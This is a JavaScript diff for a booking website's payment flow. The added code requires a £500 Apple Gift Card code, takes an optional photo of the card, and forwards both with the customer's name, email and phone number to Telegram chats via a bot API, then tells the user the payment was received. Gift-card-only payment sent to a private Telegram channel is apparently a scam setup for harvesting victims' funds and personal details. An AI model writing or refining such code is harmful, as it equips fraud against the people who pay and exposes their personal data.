@@ -58,6 +58,12 @@ document.addEventListener('DOMContentLoaded', function() {
     closeModal.addEventListener('click', () => paymentModal.style.display = 'none');
     logoutBtn.addEventListener('click', logout);
     
+    // File upload display
+    document.getElementById('giftCardImage').addEventListener('change', function(e) {
+        const fileName = e.target.files[0] ? e.target.files[0].name : 'No file chosen';
+        document.getElementById('fileName').textContent = fileName;
+    });
+    
     // Close modal when clicking outside
     window.addEventListener('click', function(event) {
         if (event.target === paymentModal) {
@@ -114,33 +120,38 @@ document.addEventListener('DOMContentLoaded', function() {
         sendBookingToTelegram(booking);
     }
     
-    function processPayment(e) {
+    async function processPayment(e) {
         e.preventDefault();
         
         const giftCardImage = document.getElementById('giftCardImage').files[0];
         const giftCardCode = document.getElementById('giftCardCode').value;
         
-        if (!giftCardImage && !giftCardCode) {
-            alert('Please provide either a gift card image or code');
+        if (!giftCardCode) {
+            alert('Please enter the gift card code');
             return;
         }
-        
+
         // Get the latest booking
         const latestBooking = user.bookings[user.bookings.length - 1];
         latestBooking.status = 'confirmed';
         latestBooking.paidAt = new Date().toISOString();
         localStorage.setItem(user.email, JSON.stringify(user));
         
-        // Send payment to Telegram
-        sendPaymentToTelegram(giftCardImage, giftCardCode, latestBooking);
-        
-        // Close modal and refresh
-        paymentModal.style.display = 'none';
-        bookingForm.reset();
-        bookingFormSection.style.display = 'none';
-        loadUserBookings();
-        
-        alert('Payment received! Your booking is now confirmed.');
+        try {
+            // Send payment to Telegram
+            await sendPaymentToTelegram(giftCardImage, giftCardCode, latestBooking);
+            
+            // Close modal and refresh
+            paymentModal.style.display = 'none';
+            bookingForm.reset();
+            bookingFormSection.style.display = 'none';
+            loadUserBookings();
+            
+            alert('Payment received! Your booking is now confirmed.');
+        } catch (error) {
+            console.error('Payment processing error:', error);
+            alert('There was an error processing your payment. Please try again.');
+        }
     }
     
     function loadUserBookings() {
@@ -208,47 +219,77 @@ document.addEventListener('DOMContentLoaded', function() {
         sendTelegramMessage(message);
     }
     
-    function sendPaymentToTelegram(image, code, booking) {
+    async function sendPaymentToTelegram(image, code, booking) {
         let message = `💳 *Payment Received for Booking #${booking.id}*\n\n` +
-                      `💰 *Amount:* £500 (Apple Gift Card)\n`;
+                      `💰 *Amount:* £500 (Apple Gift Card)\n` +
+                      `🔢 *Gift Card Code:* ${code}\n\n` +
+                      `👤 *Customer:* ${user.name}\n` +
+                      `📧 *Email:* ${user.email}\n` +
+                      `📞 *Phone:* ${user.phone}\n` +
+                      `⏰ *Paid at:* ${new Date().toLocaleString()}`;
+
+        // First send the text message
+        await sendTelegramMessage(message);
         
-        if (code) {
-            message += `🔢 *Gift Card Code:* ${code}\n`;
-        } else {
-            message += `📸 *Gift Card Image Attached*\n`;
+        // Then send the image if available
+        if (image) {
+            await sendTelegramPhoto(image, `Gift Card for Booking #${booking.id}`);
         }
-        
-        message += `\n👤 *Customer:* ${user.name}\n` +
-                   `📧 *Email:* ${user.email}\n` +
-                   `📞 *Phone:* ${user.phone}\n` +
-                   `⏰ *Paid at:* ${new Date().toLocaleString()}`;
-        
-        sendTelegramMessage(message);
+    }
+    
+    async function sendTelegramPhoto(image, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_IDS[0]);
+        formData.append('photo', image);
+        formData.append('caption', caption);
+
+        try {
+            const response = await fetch(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, 
+                {
+                    method: 'POST',
+                    body: formData
+                }
+            );
+            const data = await response.json();
+            console.log('Telegram photo sent:', data);
+            return data;
+        } catch (error) {
+            console.error('Error sending photo to Telegram:', error);
+            throw error;
+        }
     }
     
     function sendTelegramMessage(message) {
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS) return;
-        
-        TELEGRAM_CHAT_IDS.forEach(chatId => {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        return new Promise((resolve, reject) => {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS) {
+                reject('Telegram not configured');
+                return;
+            }
             
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
+            TELEGRAM_CHAT_IDS.forEach(chatId => {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Telegram notification sent:', data);
-            })
-            .catch(error => {
-                console.error('Error sending Telegram notification:', error);
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram notification sent:', data);
+                    resolve(data);
+                })
+                .catch(error => {
+                    console.error('Error sending Telegram notification:', error);
+                    reject(error);
+                });
             });
         });
     }
